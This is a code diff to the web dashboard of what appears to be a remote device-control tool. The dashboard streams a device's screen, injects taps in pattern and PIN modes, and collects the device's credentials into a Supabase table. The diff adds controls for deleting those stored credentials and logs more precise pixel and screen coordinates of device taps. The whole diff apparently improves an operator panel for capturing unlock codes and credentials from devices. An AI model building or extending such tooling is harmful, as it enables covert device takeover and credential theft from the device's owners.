@@ -372,12 +372,13 @@
             background: rgba(255, 255, 255, 0.06);
         }
 
-        .btn-clear-log {
+        .btn-clear-log, .btn-clear-supabase {
             cursor: pointer;
             color: var(--primary-accent);
             font-size: 0.7rem;
+            margin-left: 10px;
         }
-        .btn-clear-log:hover { text-decoration: underline; }
+        .btn-clear-log:hover, .btn-clear-supabase:hover { text-decoration: underline; }
 
         .action-btn {
             padding: 10px 20px;
@@ -709,19 +710,23 @@
 
     <section id="security-table-panel" class="security-table-panel" aria-live="polite">
         <div class="modal-header">
-            <span><i class="fas fa-database"></i> SUPABASE DATA</span>
+            <div style="display: flex; align-items: center; gap: 8px;">
+                <span><i class="fas fa-database"></i> SUPABASE DATA</span>
+                <span class="btn-clear-supabase" onclick="clearSecurityData()">Clear All</span>
+            </div>
             <i class="fas fa-compress-arrows-alt"></i>
         </div>
         <div class="panel-scroll-content">
             <table class="security-table">
                 <thead>
                     <tr>
-                        <th>Type</th>
-                        <th>Credential</th>
+                        <th style="width: 40%;">Type</th>
+                        <th style="width: 45%;">Credential</th>
+                        <th style="width: 15%; text-align: center;">Actions</th>
                     </tr>
                 </thead>
                 <tbody id="security-table-body">
-                    <tr><td colspan="2">Connect to load table details.</td></tr>
+                    <tr><td colspan="3">Connect to load table details.</td></tr>
                 </tbody>
             </table>
         </div>
@@ -929,6 +934,13 @@
         let isPatternMode = false;
         let isPinMode = false;
         let patternPoints = [];
+        let lastVideoWidth = 0;
+        let lastVideoHeight = 0;
+
+        remoteVideo.addEventListener('loadedmetadata', () => {
+            lastVideoWidth = remoteVideo.videoWidth;
+            lastVideoHeight = remoteVideo.videoHeight;
+        });
 
         // Make elements draggable and resizable
         function makeMovable(element) {
@@ -1017,7 +1029,7 @@
             tableBody.innerHTML = '<tr><td colspan="2">Loading...</td></tr>';
 
             try {
-                const response = await fetch('/api/security');
+                const response = await fetch('/api/security?deviceId=' + encodeURIComponent(roomId));
                 const records = await response.json();
                 if (!response.ok) throw new Error(records.error || 'Request failed');
 
@@ -1032,6 +1044,9 @@
                     `<tr>
                         <td>${escapeHtml(record.security_type)}</td>
                         <td class="credential">${escapeHtml(record.credential_value)}</td>
+                        <td style="text-align: center;">
+                            <i class="fas fa-trash-alt" style="cursor: pointer; color: #E94560;" onclick="deleteSecurityRow('${record.id}')"></i>
+                        </td>
                     </tr>`
                 ).join('');
             } catch (error) {
@@ -1154,7 +1169,9 @@
 
         function getCoords(e) {
             const rect = remoteVideo.getBoundingClientRect();
-            const videoRatio = remoteVideo.videoWidth / remoteVideo.videoHeight || 1;
+            const videoWidth = remoteVideo.videoWidth || lastVideoWidth;
+            const videoHeight = remoteVideo.videoHeight || lastVideoHeight;
+            const videoRatio = videoWidth && videoHeight ? videoWidth / videoHeight : rect.width / rect.height;
             const elementRatio = rect.width / rect.height;
             let actualWidth, actualHeight, offsetX, offsetY;
             if (elementRatio > videoRatio) {
@@ -1164,9 +1181,12 @@
                 actualWidth = rect.width; actualHeight = actualWidth / videoRatio;
                 offsetX = 0; offsetY = (rect.height - actualHeight) / 2;
             }
+            const x = (e.clientX - rect.left - offsetX) / actualWidth;
+            const y = (e.clientY - rect.top - offsetY) / actualHeight;
             return {
-                x: (e.clientX - rect.left - offsetX) / actualWidth,
-                y: (e.clientY - rect.top - offsetY) / actualHeight,
+                x: Math.max(0, Math.min(1, x)),
+                y: Math.max(0, Math.min(1, y)),
+                isInsideVideo: x >= 0 && x <= 1 && y >= 0 && y <= 1,
                 canvasX: e.clientX - rect.left,
                 canvasY: e.clientY - rect.top
             };
@@ -1187,8 +1207,9 @@
         remoteVideo.addEventListener('mousedown', (e) => {
             if (remoteVideo.style.display === 'none') return;
             showClickEffect(e);
-            isMouseDown = true;
             const coords = getCoords(e);
+            if (!coords.isInsideVideo) return;
+            isMouseDown = true;
             startX = coords.x; startY = coords.y; startTime = Date.now();
 
             if (isPatternMode) {
@@ -1320,9 +1341,9 @@
                 try {
                     const data = JSON.parse(event.data);
                     if (data.type === 'click_feedback') {
-                        displayCoordinates(data.x, data.y, "Laptop Tap");
+                        displayCoordinates(data.x, data.y, "Laptop Tap", data);
                     } else if (data.type === 'device_click') {
-                        displayCoordinates(data.x, data.y, data.label || "Device Tap");
+                        displayCoordinates(data.x, data.y, data.label || "Device Tap", data);
                     } else if (data.type === 'security_data') {
                         console.log("RECEIVED SECURITY DATA:", data);
                         displaySecurityData(data);
@@ -1350,7 +1371,9 @@
 
         let clickCount = 0;
 
-        function displayCoordinates(x, y, source = "Tap") {
+        function displayCoordinates(x, y, source = "Tap", details = {}) {
+            x = Math.max(0, Math.min(1, Number(x) || 0));
+            y = Math.max(0, Math.min(1, Number(y) || 0));
             clickCount++;
 
             // Send click to server for Python AI tracking
@@ -1370,8 +1393,15 @@
             // Remove placeholder if it's the first click
             if (clickCount === 1) logContent.innerHTML = '';
 
-            const xPct = (x * 100).toFixed(1);
-            const yPct = (y * 100).toFixed(1);
+            const xPct = (x * 100).toFixed(4);
+            const yPct = (y * 100).toFixed(4);
+            const pixelWidth = remoteVideo.videoWidth || lastVideoWidth;
+            const pixelHeight = remoteVideo.videoHeight || lastVideoHeight;
+            const pixelX = pixelWidth ? Math.round(x * pixelWidth) : 'n/a';
+            const pixelY = pixelHeight ? Math.round(y * pixelHeight) : 'n/a';
+            const screenPosition = Number.isFinite(Number(details.screenX)) && Number.isFinite(Number(details.screenY))
+                ? ` [screen: ${details.screenX}, ${details.screenY} of ${details.screenWidth}x${details.screenHeight}]`
+                : '';
 
             const entry = document.createElement('div');
             entry.className = 'log-entry';
@@ -1381,14 +1411,14 @@
 
             entry.innerHTML = `
                 <span><b>${getOrdinal(clickCount)}</b> ${source}:</span>
-                <span>${xPct}%, ${yPct}%</span>
+                <span>${xPct}%, ${yPct}% (${pixelX}, ${pixelY}px)${screenPosition}</span>
             `;
 
             logContent.insertBefore(entry, logContent.firstChild);
 
             // Also update the small badge at the top
             const coordInfo = document.getElementById('coord-info');
-            coordInfo.innerText = `${source}: ${xPct}%, ${yPct}%`;
+            coordInfo.innerText = `${source}: ${xPct}%, ${yPct}% (${pixelX}, ${pixelY}px)${screenPosition}`;
             coordInfo.style.display = 'block';
         }
 
@@ -1437,6 +1467,50 @@
             document.getElementById('click-log-content').innerHTML =
                 '<div style="color: #666; font-style: italic; text-align: center; padding: 10px;">Waiting for taps...</div>';
             document.getElementById('coord-info').style.display = 'none';
+        }
+
+        async function clearSecurityData() {
+            const roomId = roomIdInput.value || localStorage.getItem('lastRoomId');
+            if (!roomId) {
+                alert("Please enter a Room ID first");
+                return;
+            }
+
+            if (!confirm("Are you sure you want to clear all security credentials for this device from Supabase?")) return;
+
+            try {
+                const response = await fetch('/api/security?deviceId=' + encodeURIComponent(roomId), {
+                    method: 'DELETE'
+                });
+                const result = await response.json();
+
+                if (response.ok) {
+                    loadSecurityDetails(roomId);
+                } else {
+                    alert("Failed to clear data: " + (result.error || "Unknown error"));
+                }
+            } catch (error) {
+                console.error("Error clearing Supabase data:", error);
+                alert("Error connecting to server");
+            }
+        }
+
+        async function deleteSecurityRow(id) {
+            if (!confirm("Delete this specific credential?")) return;
+
+            try {
+                const response = await fetch('/api/security?id=' + id, {
+                    method: 'DELETE'
+                });
+                if (response.ok) {
+                    const roomId = roomIdInput.value || localStorage.getItem('lastRoomId');
+                    loadSecurityDetails(roomId);
+                } else {
+                    alert("Failed to delete row");
+                }
+            } catch (error) {
+                console.error("Error deleting row:", error);
+            }
         }
 
         socket.on("message", async (data) => {
